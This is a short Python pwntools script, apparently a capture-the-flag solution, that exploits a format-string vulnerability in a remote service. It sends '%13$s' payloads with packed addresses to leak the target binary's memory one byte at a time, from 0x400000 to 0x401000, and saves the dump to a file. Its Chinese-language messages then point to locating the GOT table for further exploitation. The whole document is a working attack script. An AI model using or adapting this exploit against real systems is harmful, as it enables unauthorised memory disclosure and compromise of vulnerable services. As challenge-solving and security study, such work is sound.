from pwn import *
HOST = 'challenge.bluesharkinfo.com'
PORT = 24170
context.log_level = 'error' 
def stable_dump_to_file():
    target_offset = 13
    header_len = 40
    start_addr = 0x400000 
    end_addr = 0x401000  
    print(f"[*] 开始稳定 Dump: {hex(start_addr)} -> {hex(end_addr)}")
    print("[*] 结果将保存到: dumped_bin")
    print("-" * 40)
    current_addr = start_addr
    f = open('dumped_bin', 'wb') 
    while current_addr < end_addr:
        try:
            r = remote(HOST, PORT)
            r.recvuntil(b'Have fun', drop=True)
            r.recv(timeout=0.2)
            
            fmt = f'%{target_offset}$s||||'.encode()
            payload = fmt.ljust(header_len, b'A')
            payload += p64(current_addr)
            
            r.sendline(payload)
            leak = r.recvuntil(b'||||', drop=True, timeout=2)
            r.close() 
            
            if not leak:
                byte = b'\x00'
            else:
                byte = leak[0:1]
            
            f.write(byte)
            f.flush() 
            print(f"\r[{hex(current_addr)}] Got: {byte.hex()} ", end='')
            current_addr += 1
        except KeyboardInterrupt:
            print("\n[-] 用户停止")
            break
        except Exception as e:
            continue

    f.close()
    print(f"\n\n[+] Dump 完成！文件已保存为 dumped_bin")
    print("[+] 请运行: objdump -R dumped_bin 查找 GOT 表")

if __name__ == '__main__':
    stable_dump_to_file()